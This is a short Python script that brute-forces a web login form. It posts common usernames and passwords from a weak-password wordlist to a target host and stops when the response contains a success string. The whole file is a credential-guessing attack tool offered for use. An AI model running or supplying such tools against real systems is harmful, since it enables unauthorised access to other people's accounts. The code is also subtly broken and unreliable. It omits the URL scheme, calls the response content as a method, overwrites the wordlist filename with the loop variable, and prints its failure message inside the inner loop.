from pwn import *
import requests
import sys


target="127.0.0.1:5500" # Target Host with form you wish to crack.
usernames = ['username', 'test', 'admin'] # Potential usernames for testing
password='ssh-common-passwords.txt' # List of weak passwords
needle='Success' # How to know if our entry was a success

for username in usernames:
    with open(password, 'r') as passwords_list:
        for password in passwords_list:
            password=password.strip('\n').encode()
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password":password}) # Send a post request with the data you wish to test
            if needle.encode() in r.content():
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>>>] Valid Password '{}' found for user '{}'".format(password.decode(), username))
                sys.exit()
            sys.stdout.flush()
            sys.stdout.write("\n")
            sys.stdout.write("\t No password found for user '{}'".format(username))
